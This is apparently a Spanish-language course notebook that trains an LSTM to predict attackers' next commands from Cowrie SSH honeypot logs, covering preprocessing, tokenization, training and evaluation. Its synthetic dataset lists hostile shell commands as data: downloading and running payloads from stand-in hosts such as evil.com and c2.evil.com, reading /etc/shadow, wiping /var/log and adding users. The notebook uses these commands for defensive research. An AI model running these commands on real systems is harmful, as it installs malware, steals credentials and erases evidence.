# 🛡️ Predicción de Ataques en Honeypots
**Asignatura: Seguridad de la Información**

Este notebook cubre los pasos 2 al 5 del proyecto:
1. Preprocesamiento y extracción de secuencias de comandos (logs de Cowrie)
2. Tokenización y preparación del dataset para Deep Learning
3. Entrenamiento de modelo LSTM para predicción de comandos
4. Evaluación: Accuracy, Perplexity, Precision, Recall

**Requisito previo:** tener el archivo `cowrie.json` en la misma carpeta que este notebook.  
Descargarlo del servidor con:  
```bash
scp -i "gordos.pem" -P 8080 ubuntu@TU_IP_AWS:~/honeypots/logs/cowrie/cowrie.json ./cowrie.json
```

---
## 0. Instalación de dependencias

In [ ]:
# Ejecutar solo la primera vez
!pip install torch torchvision torchaudio --index-url https://download.pytorch.org/whl/cpu -q -q
print("✅ Dependencias instaladas")

---
## 1. Imports y configuración global

In [ ]:
import json
import os
import re
import math
import random
import numpy as np
import pandas as pd
import matplotlib.pyplot as plt
import seaborn as sns
from collections import Counter, defaultdict
from sklearn.model_selection import train_test_split
from sklearn.metrics import precision_score, recall_score, classification_report

import torch
import torch.nn as nn
from torch.utils.data import Dataset, DataLoader

# Reproducibilidad
SEED = 42
random.seed(SEED)
np.random.seed(SEED)
torch.manual_seed(SEED)

# Parámetros generales
LOG_FILE      = "cowrie.json"   # Ruta al archivo de logs
SEQ_LEN       = 10              # Longitud de la ventana de contexto
MIN_FREQ      = 2               # Frecuencia mínima para incluir un token en el vocabulario
BATCH_SIZE    = 64
EMBED_DIM     = 64
HIDDEN_DIM    = 128
NUM_LAYERS    = 2
DROPOUT       = 0.3
EPOCHS        = 30
LR            = 0.001
DEVICE        = torch.device("cuda" if torch.cuda.is_available() else "cpu")

print(f"Usando dispositivo: {DEVICE}")

---
## 2. Carga y preprocesamiento de logs (PASO 2)

Los logs de Cowrie son archivos JSONL (un JSON por línea).  
Nos interesan principalmente los eventos de tipo `cowrie.command.input`,  
que contienen los comandos que ejecutan los atacantes.

In [ ]:
def cargar_logs_cowrie(filepath):
    """
    Carga el archivo cowrie.json y extrae todos los eventos.
    Cowrie guarda un JSON por línea (JSONL).
    """
    eventos = []
    with open(filepath, "r", encoding="utf-8") as f:
        for linea in f:
            linea = linea.strip()
            if not linea:
                continue
            try:
                eventos.append(json.loads(linea))
            except json.JSONDecodeError:
                pass  # Ignorar líneas malformadas
    return eventos


# --- Carga real o datos de ejemplo si no existe el archivo ---
if os.path.exists(LOG_FILE):
    print(f"📂 Cargando logs desde {LOG_FILE}...")
    eventos = cargar_logs_cowrie(LOG_FILE)
    print(f"✅ Total de eventos cargados: {len(eventos)}")
else:
    print("⚠️  No se encontró cowrie.json. Usando dataset de ejemplo sintético.")
    print("    Para usar tus datos reales, descarga cowrie.json del servidor AWS.")
    
    # Dataset sintético representativo de ataques reales en SSH honeypots
    SESIONES_EJEMPLO = [
        ["uname -a", "cat /etc/passwd", "whoami", "id", "cat /etc/shadow"],
        ["uname -a", "whoami", "ls", "ls -la", "cd /tmp", "wget http://malware.com/bot.sh", "chmod +x bot.sh", "./bot.sh"],
        ["enable", "system", "shell", "sh", "cat /proc/mounts", "cat /proc/cpuinfo"],
        ["uname -a", "cat /proc/cpuinfo", "free -m", "df -h", "ps aux", "netstat -an"],
        ["ls", "cd /tmp", "curl -O http://evil.com/miner", "chmod 777 miner", "./miner -a cryptonight"],
        ["whoami", "id", "uname -a", "ls /var/www", "cat /var/www/html/config.php"],
        ["cat /etc/passwd", "cat /etc/issue", "uname -a", "hostname", "ifconfig"],
        ["ls -la", "cat /etc/passwd", "grep root /etc/passwd", "passwd root"],
        ["cd /tmp", "wget http://attacker.com/payload", "bash payload", "rm -f payload"],
        ["uname -a", "echo test", "exit"],
        ["busybox", "cat /etc/passwd", "ls /bin", "id", "uname -m"],
        ["ps", "ps aux", "kill -9 1234", "rm -rf /var/log/*"],
        ["cat /proc/cpuinfo", "cd /var/tmp", "wget http://miner.com/x86", "chmod +x x86", "./x86"],
        ["ls /tmp", "rm -rf /tmp/*", "cd /tmp", "wget http://c2.evil.com/backdoor"],
        ["hostname", "id", "uname -s -m", "cat /etc/redhat-release"],
        ["uname -a", "whoami", "cat /etc/passwd", "cat /etc/shadow", "useradd hacker"],
        ["ls", "ls -la", "pwd", "uname -a", "id"],
        ["echo $PATH", "env", "cat /proc/version", "uname -r"],
        ["cd /dev/shm", "wget http://botnet.cc/agent", "./agent &", "disown"],
        ["cat /etc/crontab", "crontab -l", "crontab -e"],
    ] * 50  # Repetimos para tener dataset más grande
    
    # Crear eventos en formato Cowrie
    eventos = []
    session_counter = 0
    for sesion in SESIONES_EJEMPLO:
        session_id = f"session_{session_counter:06d}"
        for cmd in sesion:
            eventos.append({
                "eventid": "cowrie.command.input",
                "session": session_id,
                "input": cmd,
                "timestamp": "2026-03-10T12:30:00Z"
            })
        session_counter += 1
    print(f"✅ Dataset de ejemplo creado con {len(eventos)} eventos")

In [ ]:
# Análisis exploratorio de los tipos de eventos
tipos = Counter(e.get("eventid", "desconocido") for e in eventos)

print("📊 Tipos de eventos en los logs:")
for tipo, count in tipos.most_common(15):
    print(f"   {tipo:<45} → {count:>6} eventos")

In [ ]:
def limpiar_comando(cmd):
    """
    Normaliza un comando para reducir el vocabulario sin perder semántica:
    - Convierte a minúsculas
    - Elimina rutas absolutas largas (mantiene el ejecutable)
    - Reemplaza IPs y URLs por tokens genéricos
    - Reemplaza números sueltos por <NUM>
    - Trunca comandos muy largos
    """
    cmd = cmd.lower().strip()
    cmd = re.sub(r'https?://\S+', '<URL>', cmd)                # URLs
    cmd = re.sub(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', '<IP>', cmd) # IPs
    cmd = re.sub(r'\b\d{5,}\b', '<NUM>', cmd)                  # Números largos (puertos, PIDs...)
    cmd = re.sub(r'/(?:[\w./-]+/)+([\w.]+)', r'/\1', cmd)      # Rutas → solo nombre final
    cmd = re.sub(r'\s+', ' ', cmd).strip()                     # Espacios múltiples
    return cmd[:120]  # Truncar


def extraer_sesiones(eventos):
    """
    Agrupa los comandos por sesión (session_id) y los ordena cronológicamente.
    Retorna: dict {session_id: [cmd1, cmd2, ...]}
    """
    sesiones = defaultdict(list)
    for evento in eventos:
        if evento.get("eventid") == "cowrie.command.input":
            session = evento.get("session", "unknown")
            cmd = evento.get("input", "").strip()
            if cmd:  # Ignorar comandos vacíos
                sesiones[session].append(limpiar_comando(cmd))
    return dict(sesiones)


sesiones = extraer_sesiones(eventos)
num_comandos_total = sum(len(v) for v in sesiones.values())

print(f"📌 Sesiones con comandos: {len(sesiones)}")
print(f"📌 Total de comandos capturados: {num_comandos_total}")

if sesiones:
    longitudes = [len(v) for v in sesiones.values()]
    print(f"📌 Comandos por sesión — media: {np.mean(longitudes):.1f}, "
          f"máx: {max(longitudes)}, mín: {min(longitudes)}")

In [ ]:
# Visualización: comandos más frecuentes
todos_los_comandos = [cmd for cmds in sesiones.values() for cmd in cmds]
frecuencias = Counter(todos_los_comandos)

top_n = 20
top_cmds = frecuencias.most_common(top_n)

fig, ax = plt.subplots(figsize=(12, 6))
ax.barh([c[0][:60] for c in top_cmds[::-1]], [c[1] for c in top_cmds[::-1]], color="steelblue")
ax.set_xlabel("Frecuencia")
ax.set_title(f"Top {top_n} comandos más ejecutados por atacantes")
ax.tick_params(axis='y', labelsize=9)
plt.tight_layout()
plt.savefig("top_comandos.png", dpi=150)
plt.show()
print("✅ Gráfica guardada en top_comandos.png")

In [ ]:
# Visualización: distribución de longitudes de sesión
longitudes = [len(v) for v in sesiones.values()]

fig, ax = plt.subplots(figsize=(10, 4))
ax.hist(longitudes, bins=30, color="coral", edgecolor="black")
ax.set_xlabel("Nº de comandos por sesión")
ax.set_ylabel("Frecuencia")
ax.set_title("Distribución de longitudes de sesiones de ataque")
plt.tight_layout()
plt.savefig("distribucion_sesiones.png", dpi=150)
plt.show()

---
## 3. Tokenización y preparación del dataset (PASO 3)

Cada comando único es un token. Construimos un vocabulario y codificamos
las secuencias numéricamente. Usamos una **ventana deslizante** de longitud `SEQ_LEN`:
- Input: los últimos `SEQ_LEN` comandos de la sesión
- Target: el siguiente comando (lo que el modelo debe predecir)

In [ ]:
class Vocabulario:
    """
    Mapea comandos (strings) a índices enteros y viceversa.
    Tokens especiales:
      <PAD> → relleno para secuencias cortas
      <UNK> → comando desconocido (fuera de vocabulario)
    """
    PAD = "<PAD>"
    UNK = "<UNK>"

    def __init__(self, min_freq=2):
        self.min_freq = min_freq
        self.token2idx = {self.PAD: 0, self.UNK: 1}
        self.idx2token = {0: self.PAD, 1: self.UNK}

    def construir(self, secuencias):
        """Recibe lista de listas de comandos y construye el vocabulario."""
        contador = Counter(cmd for seq in secuencias for cmd in seq)
        for token, freq in contador.items():
            if freq >= self.min_freq and token not in self.token2idx:
                idx = len(self.token2idx)
                self.token2idx[token] = idx
                self.idx2token[idx] = token
        return self

    def encode(self, token):
        return self.token2idx.get(token, self.token2idx[self.UNK])

    def decode(self, idx):
        return self.idx2token.get(idx, self.UNK)

    def __len__(self):
        return len(self.token2idx)


# Construir vocabulario con las sesiones de entrenamiento
todas_las_sesiones = list(sesiones.values())

vocab = Vocabulario(min_freq=MIN_FREQ)
vocab.construir(todas_las_sesiones)

print(f"✅ Vocabulario construido: {len(vocab)} tokens únicos")
print(f"   (incluyendo <PAD> y <UNK>)")
print("\nEjemplos del vocabulario:")
for token, idx in list(vocab.token2idx.items())[2:12]:
    print(f"   {idx:>4} → '{token}'")

In [ ]:
def crear_muestras_ventana(sesiones_dict, vocab, seq_len):
    """
    Para cada sesión, genera pares (contexto, siguiente_comando) usando
    ventana deslizante.
    
    Ejemplo con seq_len=3:
      Sesión: [A, B, C, D, E]
      Muestras: ([PAD, PAD, A], B), ([PAD, A, B], C), ([A, B, C], D), ([B, C, D], E)
    """
    X, y = [], []
    pad_idx = vocab.encode(Vocabulario.PAD)

    for cmds in sesiones_dict.values():
        if len(cmds) < 2:  # Necesitamos al menos 1 input + 1 target
            continue
        encoded = [vocab.encode(c) for c in cmds]

        for i in range(1, len(encoded)):
            # Tomar los SEQ_LEN comandos anteriores como contexto
            inicio = max(0, i - seq_len)
            contexto = encoded[inicio:i]
            # Rellenar con PAD por la izquierda si el contexto es corto
            padding = [pad_idx] * (seq_len - len(contexto))
            X.append(padding + contexto)
            y.append(encoded[i])

    return np.array(X, dtype=np.int64), np.array(y, dtype=np.int64)


X, y = crear_muestras_ventana(sesiones, vocab, SEQ_LEN)

print(f"✅ Dataset generado:")
print(f"   X shape: {X.shape}  (muestras × longitud_contexto)")
print(f"   y shape: {y.shape}  (muestras)")
print(f"\nEjemplo de muestra:")
if len(X) > 0:
    print(f"   X[0] = {X[0]}")
    print(f"   → '{[vocab.decode(i) for i in X[0]]}'")
    print(f"   y[0] = {y[0]} → '{vocab.decode(y[0])}' (comando a predecir)")

In [ ]:
# Split train/val/test: 70% / 15% / 15%
X_train, X_temp, y_train, y_temp = train_test_split(
    X, y, test_size=0.30, random_state=SEED, stratify=None
)
X_val, X_test, y_val, y_test = train_test_split(
    X_temp, y_temp, test_size=0.50, random_state=SEED
)

print(f"✅ División del dataset:")
print(f"   Train:      {len(X_train):>6} muestras ({100*len(X_train)/len(X):.1f}%)")
print(f"   Validación: {len(X_val):>6} muestras ({100*len(X_val)/len(X):.1f}%)")
print(f"   Test:       {len(X_test):>6} muestras ({100*len(X_test)/len(X):.1f}%)")


class CowrieDataset(Dataset):
    """Dataset PyTorch para las secuencias de comandos."""
    def __init__(self, X, y):
        self.X = torch.tensor(X, dtype=torch.long)
        self.y = torch.tensor(y, dtype=torch.long)

    def __len__(self):
        return len(self.X)

    def __getitem__(self, idx):
        return self.X[idx], self.y[idx]


train_loader = DataLoader(CowrieDataset(X_train, y_train), batch_size=BATCH_SIZE, shuffle=True)
val_loader   = DataLoader(CowrieDataset(X_val, y_val),   batch_size=BATCH_SIZE)
test_loader  = DataLoader(CowrieDataset(X_test, y_test),  batch_size=BATCH_SIZE)

print(f"\n✅ DataLoaders creados (batch_size={BATCH_SIZE})")

---
## 4. Modelo LSTM (PASO 4)

Arquitectura:
- **Embedding**: convierte índices de tokens en vectores densos
- **LSTM** (2 capas): procesa la secuencia de contexto
- **Dropout**: regularización para evitar overfitting
- **Linear**: proyección final al tamaño del vocabulario (logits)

La tarea es **clasificación multiclase**: predecir qué token (comando)
viene después dado el contexto.

In [ ]:
class LSTMPredictor(nn.Module):
    """
    Modelo LSTM para predicción del siguiente comando en una secuencia de ataque.
    
    Args:
        vocab_size  : tamaño del vocabulario (número de tokens únicos)
        embed_dim   : dimensión del embedding de cada token
        hidden_dim  : dimensión del estado oculto del LSTM
        num_layers  : número de capas LSTM apiladas
        dropout     : probabilidad de dropout (regularización)
        pad_idx     : índice del token PAD (no contribuye al gradiente)
    """
    def __init__(self, vocab_size, embed_dim, hidden_dim, num_layers, dropout, pad_idx):
        super().__init__()
        self.embedding = nn.Embedding(vocab_size, embed_dim, padding_idx=pad_idx)
        self.lstm = nn.LSTM(
            input_size=embed_dim,
            hidden_size=hidden_dim,
            num_layers=num_layers,
            batch_first=True,
            dropout=dropout if num_layers > 1 else 0.0
        )
        self.dropout = nn.Dropout(dropout)
        self.fc = nn.Linear(hidden_dim, vocab_size)

    def forward(self, x):
        # x: (batch, seq_len)
        emb = self.dropout(self.embedding(x))         # (batch, seq_len, embed_dim)
        out, _ = self.lstm(emb)                        # (batch, seq_len, hidden_dim)
        last = out[:, -1, :]                           # Solo el último paso temporal
        logits = self.fc(self.dropout(last))           # (batch, vocab_size)
        return logits


model = LSTMPredictor(
    vocab_size = len(vocab),
    embed_dim  = EMBED_DIM,
    hidden_dim = HIDDEN_DIM,
    num_layers = NUM_LAYERS,
    dropout    = DROPOUT,
    pad_idx    = vocab.encode(Vocabulario.PAD)
).to(DEVICE)

# Parámetros totales del modelo
n_params = sum(p.numel() for p in model.parameters() if p.requires_grad)
print(model)
print(f"\n✅ Modelo creado con {n_params:,} parámetros entrenables")

In [ ]:
# Función de pérdida y optimizador
# Ignoramos el índice PAD en la pérdida
criterion = nn.CrossEntropyLoss(ignore_index=vocab.encode(Vocabulario.PAD))
optimizer = torch.optim.Adam(model.parameters(), lr=LR, weight_decay=1e-5)
scheduler = torch.optim.lr_scheduler.ReduceLROnPlateau(
    optimizer, mode="min", factor=0.5, patience=5, verbose=True
)


def run_epoch(model, loader, criterion, optimizer=None, training=True):
    """Ejecuta una época de entrenamiento o evaluación."""
    model.train() if training else model.eval()
    total_loss, total_correct, total_samples = 0.0, 0, 0

    ctx = torch.enable_grad() if training else torch.no_grad()
    with ctx:
        for X_batch, y_batch in loader:
            X_batch = X_batch.to(DEVICE)
            y_batch = y_batch.to(DEVICE)

            logits = model(X_batch)          # (batch, vocab_size)
            loss   = criterion(logits, y_batch)

            if training:
                optimizer.zero_grad()
                loss.backward()
                nn.utils.clip_grad_norm_(model.parameters(), max_norm=1.0)  # Gradient clipping
                optimizer.step()

            preds = logits.argmax(dim=1)
            total_correct  += (preds == y_batch).sum().item()
            total_samples  += y_batch.size(0)
            total_loss     += loss.item() * y_batch.size(0)

    avg_loss = total_loss / total_samples
    accuracy = total_correct / total_samples
    return avg_loss, accuracy


print("✅ Funciones de entrenamiento definidas")

In [ ]:
# ===== BUCLE DE ENTRENAMIENTO =====
historia = {"train_loss": [], "val_loss": [], "train_acc": [], "val_acc": []}
mejor_val_loss = float("inf")
best_model_path = "lstm_honeypot_best.pt"

print(f"🚀 Entrenando durante {EPOCHS} épocas en {DEVICE}...\n")
print(f"{'Época':>6} | {'Train Loss':>10} | {'Val Loss':>10} | {'Train Acc':>10} | {'Val Acc':>10}")
print("-" * 60)

for epoch in range(1, EPOCHS + 1):
    train_loss, train_acc = run_epoch(model, train_loader, criterion, optimizer, training=True)
    val_loss,   val_acc   = run_epoch(model, val_loader,   criterion, training=False)
    scheduler.step(val_loss)

    historia["train_loss"].append(train_loss)
    historia["val_loss"].append(val_loss)
    historia["train_acc"].append(train_acc)
    historia["val_acc"].append(val_acc)

    # Guardar el mejor modelo
    if val_loss < mejor_val_loss:
        mejor_val_loss = val_loss
        torch.save(model.state_dict(), best_model_path)
        marcador = " ← mejor"
    else:
        marcador = ""

    if epoch % 5 == 0 or epoch == 1:
        print(f"{epoch:>6} | {train_loss:>10.4f} | {val_loss:>10.4f} | "
              f"{train_acc:>10.4f} | {val_acc:>10.4f}{marcador}")

print(f"\n✅ Entrenamiento completado. Mejor val_loss: {mejor_val_loss:.4f}")
print(f"   Pesos guardados en '{best_model_path}'")

In [ ]:
# Curvas de aprendizaje
fig, axes = plt.subplots(1, 2, figsize=(14, 5))

# Pérdida
axes[0].plot(historia["train_loss"], label="Train", color="steelblue")
axes[0].plot(historia["val_loss"],   label="Validación", color="coral")
axes[0].set_xlabel("Época")
axes[0].set_ylabel("Cross-Entropy Loss")
axes[0].set_title("Curva de pérdida (Loss)")
axes[0].legend()
axes[0].grid(True, alpha=0.3)

# Accuracy
axes[1].plot(historia["train_acc"], label="Train", color="steelblue")
axes[1].plot(historia["val_acc"],   label="Validación", color="coral")
axes[1].set_xlabel("Época")
axes[1].set_ylabel("Accuracy")
axes[1].set_title("Curva de precisión (Accuracy)")
axes[1].legend()
axes[1].grid(True, alpha=0.3)

plt.suptitle("Curvas de Entrenamiento — LSTM Honeypot", fontsize=13, fontweight="bold")
plt.tight_layout()
plt.savefig("curvas_entrenamiento.png", dpi=150)
plt.show()
print("✅ Gráfica guardada en curvas_entrenamiento.png")

---
## 5. Evaluación del modelo (PASO 5)

Cargamos el mejor modelo y evaluamos sobre el conjunto de **test** con:
- **Accuracy**: fracción de predicciones correctas
- **Perplexity**: qué tan "sorprendido" está el modelo (menor = mejor)
- **Precision / Recall**: macro-promediados sobre todas las clases

In [ ]:
# Cargar el mejor modelo guardado
model.load_state_dict(torch.load(best_model_path, map_location=DEVICE))
model.eval()
print(f"✅ Mejor modelo cargado desde '{best_model_path}'")

In [ ]:
def evaluar_completo(model, loader, criterion, vocab):
    """
    Evaluación completa sobre un loader.
    Calcula: loss, accuracy, perplexity, precision, recall.
    """
    model.eval()
    all_preds, all_labels = [], []
    total_loss, total_samples = 0.0, 0

    with torch.no_grad():
        for X_batch, y_batch in loader:
            X_batch = X_batch.to(DEVICE)
            y_batch = y_batch.to(DEVICE)
            logits = model(X_batch)
            loss = criterion(logits, y_batch)

            preds = logits.argmax(dim=1)
            all_preds.extend(preds.cpu().numpy())
            all_labels.extend(y_batch.cpu().numpy())
            total_loss    += loss.item() * y_batch.size(0)
            total_samples += y_batch.size(0)

    avg_loss   = total_loss / total_samples
    perplexity = math.exp(avg_loss)             # PP = e^(cross-entropy)
    accuracy   = np.mean(np.array(all_preds) == np.array(all_labels))

    # Precision y Recall macro (promedio sobre todas las clases)
    precision = precision_score(all_labels, all_preds, average="macro", zero_division=0)
    recall    = recall_score(all_labels, all_preds, average="macro", zero_division=0)

    return {
        "loss":       avg_loss,
        "perplexity": perplexity,
        "accuracy":   accuracy,
        "precision":  precision,
        "recall":     recall,
        "preds":      all_preds,
        "labels":     all_labels
    }


resultados = evaluar_completo(model, test_loader, criterion, vocab)

print("📊 MÉTRICAS FINALES EN TEST SET")
print("=" * 40)
print(f"   Loss        : {resultados['loss']:.4f}")
print(f"   Perplexity  : {resultados['perplexity']:.2f}")
print(f"   Accuracy    : {resultados['accuracy']*100:.2f}%")
print(f"   Precision   : {resultados['precision']*100:.2f}%  (macro)")
print(f"   Recall      : {resultados['recall']*100:.2f}%  (macro)")

In [ ]:
# Top-5 Accuracy: el modelo acierta si el comando real está entre sus 5 primeras predicciones
def top_k_accuracy(model, loader, k=5):
    model.eval()
    correct, total = 0, 0
    with torch.no_grad():
        for X_batch, y_batch in loader:
            X_batch = X_batch.to(DEVICE)
            y_batch = y_batch.to(DEVICE)
            logits = model(X_batch)
            topk = logits.topk(k, dim=1).indices  # (batch, k)
            correct += (topk == y_batch.unsqueeze(1)).any(dim=1).sum().item()
            total   += y_batch.size(0)
    return correct / total


top5_acc = top_k_accuracy(model, test_loader, k=5)
top3_acc = top_k_accuracy(model, test_loader, k=3)
print(f"   Top-3 Acc   : {top3_acc*100:.2f}%")
print(f"   Top-5 Acc   : {top5_acc*100:.2f}%")

In [ ]:
# Resumen visual de métricas
metricas = {
    "Accuracy": resultados["accuracy"],
    "Precision\n(macro)": resultados["precision"],
    "Recall\n(macro)": resultados["recall"],
    "Top-3\nAccuracy": top3_acc,
    "Top-5\nAccuracy": top5_acc,
}

fig, ax = plt.subplots(figsize=(10, 5))
colores = ["#2196F3", "#4CAF50", "#FF9800", "#9C27B0", "#F44336"]
bars = ax.bar(metricas.keys(), [v * 100 for v in metricas.values()], color=colores, edgecolor="black", alpha=0.85)

for bar, val in zip(bars, metricas.values()):
    ax.text(bar.get_x() + bar.get_width() / 2, bar.get_height() + 0.5,
            f"{val*100:.1f}%", ha="center", va="bottom", fontweight="bold")

ax.set_ylim(0, 110)
ax.set_ylabel("Porcentaje (%)")
ax.set_title("Métricas de evaluación — LSTM Honeypot")
ax.axhline(y=100, linestyle="--", color="gray", alpha=0.5)
plt.tight_layout()
plt.savefig("metricas_evaluacion.png", dpi=150)
plt.show()

print(f"\n📌 Perplexity: {resultados['perplexity']:.2f}")
print(f"   → Un valor cercano a 1 indica predicciones muy confiables.")
print(f"   → Un valor igual al tamaño del vocabulario ({len(vocab)}) sería predicción aleatoria.")

In [ ]:
# Informe de clasificación para las clases más frecuentes
# (limitamos a las 20 más frecuentes para que sea legible)
label_counts = Counter(resultados["labels"])
top_clases = [idx for idx, _ in label_counts.most_common(20)]

mask = np.isin(resultados["labels"], top_clases)
labels_filt = np.array(resultados["labels"])[mask]
preds_filt  = np.array(resultados["preds"])[mask]

nombres = [vocab.decode(i)[:40] for i in sorted(set(labels_filt))]
targets_sorted = sorted(set(labels_filt))

print("📋 Informe de clasificación (Top 20 comandos más frecuentes):")
print(classification_report(
    labels_filt, preds_filt,
    labels=targets_sorted,
    target_names=nombres,
    zero_division=0
))

---
## 6. Demostración: predicción en tiempo real

Dado un contexto de comandos, el modelo predice cuál será el siguiente.

In [ ]:
def predecir_siguiente(model, vocab, contexto, seq_len, top_k=5, device=DEVICE):
    """
    Dado un contexto (lista de comandos), predice el siguiente comando.
    
    Args:
        contexto : lista de strings con los últimos comandos
        top_k    : número de candidatos a mostrar
    """
    model.eval()
    encoded = [vocab.encode(c) for c in contexto]
    # Ajustar a seq_len
    if len(encoded) >= seq_len:
        encoded = encoded[-seq_len:]
    else:
        pad = [vocab.encode(Vocabulario.PAD)] * (seq_len - len(encoded))
        encoded = pad + encoded

    x = torch.tensor([encoded], dtype=torch.long).to(device)
    with torch.no_grad():
        logits = model(x)[0]  # (vocab_size,)
        probs  = torch.softmax(logits, dim=0)

    top_probs, top_indices = probs.topk(top_k)
    candidatos = [
        (vocab.decode(idx.item()), prob.item())
        for idx, prob in zip(top_indices, top_probs)
    ]
    return candidatos


# Ejemplos de predicción
ejemplos_contexto = [
    ["uname -a", "whoami", "id"],
    ["cd /tmp", "wget <URL>"],
    ["cat /etc/passwd", "grep root /etc/passwd"],
]

for contexto in ejemplos_contexto:
    print(f"\n🔍 Contexto: {contexto}")
    print(f"   → Predicciones del siguiente comando:")
    candidatos = predecir_siguiente(model, vocab, contexto, SEQ_LEN, top_k=5)
    for i, (cmd, prob) in enumerate(candidatos, 1):
        barra = "█" * int(prob * 30)
        print(f"   {i}. {prob*100:5.1f}% {barra} '{cmd}'")

---
## 7. Guardado final de artefactos

In [ ]:
import pickle

# Guardar el vocabulario (necesario para inferencia posterior)
with open("vocab_honeypot.pkl", "wb") as f:
    pickle.dump(vocab, f)

# Guardar el modelo final (estado actual, no solo el mejor)
torch.save(model.state_dict(), "lstm_honeypot_final.pt")

# Guardar métricas en JSON para el informe
resumen = {
    "vocab_size":   len(vocab),
    "total_samples": len(X),
    "train_samples": len(X_train),
    "val_samples":   len(X_val),
    "test_samples":  len(X_test),
    "seq_len":       SEQ_LEN,
    "epochs":        EPOCHS,
    "mejor_val_loss": round(mejor_val_loss, 4),
    "test_loss":      round(resultados["loss"], 4),
    "test_perplexity": round(resultados["perplexity"], 2),
    "test_accuracy":   round(resultados["accuracy"], 4),
    "test_precision":  round(resultados["precision"], 4),
    "test_recall":     round(resultados["recall"], 4),
    "test_top3_acc":   round(top3_acc, 4),
    "test_top5_acc":   round(top5_acc, 4),
}

with open("metricas_finales.json", "w") as f:
    json.dump(resumen, f, indent=2)

print("✅ Artefactos guardados:")
print("   📦 lstm_honeypot_best.pt    → pesos del mejor modelo")
print("   📦 lstm_honeypot_final.pt   → pesos del modelo final")
print("   📦 vocab_honeypot.pkl       → vocabulario")
print("   📊 metricas_finales.json    → resumen de métricas")
print("   📈 top_comandos.png")
print("   📈 distribucion_sesiones.png")
print("   📈 curvas_entrenamiento.png")
print("   📈 metricas_evaluacion.png")

---
## Resumen

| Paso | Descripción | Estado |
|------|-------------|--------|
| 1 | Despliegue honeypot Cowrie en AWS | ✅ Completado |
| 2 | Preprocesamiento y extracción de comandos | ✅ Completado |
| 3 | Tokenización y dataset con ventana deslizante | ✅ Completado |
| 4 | Entrenamiento modelo LSTM | ✅ Completado |
| 5 | Evaluación: Accuracy, Perplexity, Precision, Recall | ✅ Completado |